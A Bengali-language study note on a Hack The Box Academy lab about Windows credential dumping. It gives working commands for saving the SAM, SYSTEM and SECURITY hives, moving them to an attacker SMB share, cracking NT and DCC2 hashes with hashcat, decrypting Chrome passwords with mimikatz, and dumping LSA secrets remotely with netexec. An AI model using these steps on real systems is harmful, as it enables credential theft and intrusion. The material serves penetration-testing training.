# Attacking SAM, SYSTEM & SECURITY - [LINK](https://academy.hackthebox.com/app/module/147/section/1315)


উইন্ডোজ সিস্টেমে অ্যাডমিনিস্ট্রেটিভ (Administrative) বা সর্বোচ্চ অ্যাক্সেস পাওয়ার পর আমাদের প্রথম কাজগুলোর একটি হলো SAM ডাটাবেস সম্পর্কিত ফাইলগুলো কপি করা। এই ফাইলগুলো আমরা আমাদের অ্যাটাকিং মেশিনে (অফলাইনে) নিয়ে এসে পাসওয়ার্ড ক্র্যাক করার চেষ্টা করি। অফলাইনে ক্র্যাক করার সুবিধা হলো, টার্গেট মেশিনের সাথে আমাদের সবসময় কানেক্টেড থাকতে হয় না।

## Registry Hives (রেজিস্ট্রি হাইভ)

যদি আমাদের কাছে লোকাল অ্যাডমিন অ্যাক্সেস থাকে, তবে আমরা তিনটি প্রধান রেজিস্ট্রি হাইভ কপি করতে পারি। পাসওয়ার্ড ডাম্প (Dump) এবং ক্র্যাক করার ক্ষেত্রে এদের প্রত্যেকটির নির্দিষ্ট কাজ রয়েছে:

| রেজিস্ট্রি হাইভ (Registry Hive) | বর্ণনা (Description) |
| --- | --- |
| **HKLM\SAM** | এতে লোকাল ইউজারদের পাসওয়ার্ডের হ্যাশ (Hash) থাকে। এই হ্যাশগুলো বের করে ক্র্যাক করলে আমরা আসল পাসওয়ার্ড পেয়ে যাই। |
| **HKLM\SYSTEM** | এখানে সিস্টেমের বুট কি (Boot key) সেভ করা থাকে, যা দিয়ে SAM ডাটাবেসটি লক বা এনক্রিপ্ট করা থাকে। হ্যাশ ডিক্রিপ্ট করার জন্য এই চাবিটি অবশ্যই লাগবে। |
| **HKLM\SECURITY** | এতে LSA (Local Security Authority) এর সংবেদনশীল তথ্য থাকে। যেমন: ক্যাশ (Cache) করা ডোমেইন ক্রেডেনশিয়াল (DCC2), ক্লিয়ারটেক্সট পাসওয়ার্ড, DPAPI কি ইত্যাদি। |

আমরা `reg.exe` টুলের মাধ্যমে এই হাইভগুলো ব্যাকআপ বা কপি করতে পারি।

## Using reg.exe to copy registry hives (reg.exe ব্যবহার করে হাইভ কপি করা)

অ্যাডমিনিস্ট্রেটর হিসেবে `cmd.exe` চালু করে নিচের কমান্ডগুলো দিলে হাইভগুলো সেভ হয়ে যাবে:

```cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
The operation completed successfully.

```

যদি আমরা শুধু লোকাল ইউজারদের হ্যাশ চাই, তবে HKLM\SAM এবং HKLM\SYSTEM হলেই চলে। তবে HKLM\SECURITY কপি করাও বুদ্ধিমানের কাজ, কারণ ডোমেইনে যুক্ত থাকা মেশিনে এটি থেকে অনেক গুরুত্বপূর্ণ ডাটা পাওয়া যায়। ফাইলগুলো সেভ হওয়ার পর, এগুলো আমাদের অ্যাটাকিং মেশিনে ট্রান্সফার করতে হবে। এর জন্য আমরা Impacket এর `smbserver` ব্যবহার করব।

## Creating a share with smbserver (smbserver দিয়ে শেয়ার তৈরি করা)

ফাইল ট্রান্সফারের জন্য আমাদের অ্যাটাকিং মেশিনে একটি শেয়ার ফোল্ডার তৈরি করতে হবে। এর জন্য `smbserver.py -smb2support` কমান্ডটি ব্যবহার করা হয়। এখানে `-smb2support` ফ্ল্যাগটি অত্যন্ত জরুরি, কারণ আধুনিক উইন্ডোজ সিস্টেমে সিকিউরিটির কারণে পুরনো SMBv1 বন্ধ থাকে।

## Moving hive copies to share (শেয়ার ফোল্ডারে হাইভ কপি পাঠানো)

অ্যাটাকিং মেশিনে শেয়ার ফোল্ডার চালু হওয়ার পর, টার্গেট উইন্ডোজ মেশিন থেকে `move` কমান্ড দিয়ে ফাইলগুলো পাঠিয়ে দেওয়া যায়:

```cmd
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.

```

ফাইলগুলো ঠিকমতো এসেছে কিনা তা অ্যাটাকিং মেশিনে `ls` কমান্ড দিয়ে চেক করা যায়:

```shellsession
00Luffy00@htb[/htb]$ ls

sam.save  security.save  system.save

```

## Dumping hashes with secretsdump (secretsdump দিয়ে হ্যাশ বের করা)

## Cracking hashes with Hashcat (Hashcat দিয়ে হ্যাশ ভাঙা)

আমরা পাওয়া NT হ্যাশগুলো কপি করে একটি টেক্সট ফাইলে (যেমন: `hashestocrack.txt`) সেভ করব।

```shellsession
00Luffy00@htb[/htb]$ sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2

```

NT হ্যাশ (বা NTLM হ্যাশ) ক্র্যাক করার জন্য Hashcat এর মোড হলো **1000** (`-m 1000`)। আমরা ওয়ার্ডলিস্ট হিসেবে `rockyou.txt` ব্যবহার করব:

```shellsession
00Luffy00@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
184ecdda8cf1dd238d438c4aea4d560d:adrian          
31d6cfe0d16ae931b73c59d7e0c089c0:                

```

এখানে আমরা দেখতে পাচ্ছি Hashcat সফলভাবে ৩টি হ্যাশ ক্র্যাক করে আসল পাসওয়ার্ড (যেমন: dragon, iloveme, adrian) বের করে ফেলেছে। মানুষ প্রায়শই বিভিন্ন জায়গায় একই পাসওয়ার্ড ব্যবহার করে, তাই এগুলো দিয়ে নেটওয়ার্কের অন্য সিস্টেমেও ঢোকার চেষ্টা করা যেতে পারে।

## DCC2 Hashes (ক্যাশ করা ডোমেইন হ্যাশ)

আগে আমরা দেখেছি `hklm\security` থেকে DCC2 হ্যাশ পাওয়া যায়। এটি মূলত ডোমেইন ক্রেডেনশিয়ালের লোকাল কপি। দেখতে এমন হয়:
`inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25`

এই হ্যাশগুলো NT হ্যাশের চেয়ে অনেক বেশি শক্তিশালী (PBKDF2 ব্যবহার করে) এবং এগুলো দিয়ে Pass-the-Hash অ্যাটাক করা যায় না। Hashcat এ DCC2 ক্র্যাক করার মোড হলো **2100**।

```shellsession
00Luffy00@htb[/htb]$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt

$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25:ihatepasswords

```

মনে রাখতে হবে, NT হ্যাশ যেখানে প্রতি সেকেন্ডে লাখ লাখ বার চেক করা যায়, সেখানে DCC2 হ্যাশ ক্র্যাক করার স্পিড প্রায় ৮০০ গুণ ধীর। তাই পাসওয়ার্ড স্ট্রং হলে সাধারণ সময়ের মধ্যে এটি ক্র্যাক করা প্রায় অসম্ভব।

## DPAPI (Data Protection API)

`hklm\security` থেকে আমরা DPAPI এর মেশিন এবং ইউজার কি (Key) পেয়েছিলাম। DPAPI হলো উইন্ডোজের এমন একটি ফিচার যা ইউজার লেভেলে ডাটা এনক্রিপ্ট বা ডিক্রিপ্ট করতে ব্যবহৃত হয়। বিভিন্ন থার্ড-পার্টি অ্যাপ্লিকেশন এটি ব্যবহার করে।

| অ্যাপ্লিকেশন (Applications) | DPAPI এর ব্যবহার (Use of DPAPI) |
| --- | --- |
| **Internet Explorer / Chrome** | সেভ করা ওয়েবসাইটের ইউজারনেম এবং পাসওয়ার্ড সংরক্ষণে। |
| **Outlook** | ইমেইল অ্যাকাউন্টের পাসওয়ার্ড সংরক্ষণে। |
| **Remote Desktop Connection** | রিমোট মেশিনের সেভ করা ক্রেডেনশিয়াল সংরক্ষণে। |
| **Credential Manager** | শেয়ার ফোল্ডার, VPN বা ওয়াইফাইয়ের পাসওয়ার্ড সংরক্ষণে। |

Mimikatz এর মতো টুল ব্যবহার করে আমরা সহজেই DPAPI দিয়ে এনক্রিপ্ট করা ডাটা (যেমন ক্রোম ব্রাউজারের পাসওয়ার্ড) ডিক্রিপ্ট করতে পারি:

```cmd
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
Username: bob
Password: April2025!

```

## Remote dumping & LSA secrets considerations (রিমোটলি ডাম্প করার পদ্ধতি)

লোকাল অ্যাডমিন অ্যাক্সেস থাকলে আমরা সরাসরি নেটওয়ার্কের মাধ্যমেই (রিমোটলি) LSA সিক্রেট এবং SAM ডাটাবেস ডাম্প করতে পারি। এর জন্য `netexec` অত্যন্ত কার্যকর।

**রিমোটলি LSA সিক্রেট ডাম্প করা:**

```shellsession
00Luffy00@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

```

**রিমোটলি SAM ডাম্প করা:**

```shellsession
00Luffy00@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

```
